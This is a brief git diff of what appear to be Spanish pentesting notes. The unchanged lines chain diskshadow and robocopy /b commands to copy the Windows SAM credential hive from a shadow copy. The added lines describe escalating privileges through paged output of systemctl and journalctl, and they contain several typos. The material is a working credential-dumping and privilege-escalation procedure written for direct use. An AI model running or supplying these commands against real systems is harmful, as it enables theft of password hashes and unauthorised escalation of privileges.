@@ -31,6 +31,10 @@ echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -app
 echo "create" | out-file ./diskshadow.txt -encoding ascii -append        
 echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
 
+### PRIVESC CON PAGINACION ###
+
+Hay ciertos comnados como sytemctl, journaltcl... que si coseguimos que nos muestren resultados con paginacion podemos escalar privilegios.
+
 diskshadow.exe /s c:\temp\diskshadow.txt
 
 robocopy /b Z:\Windows\System32\Config C:\temp SAM
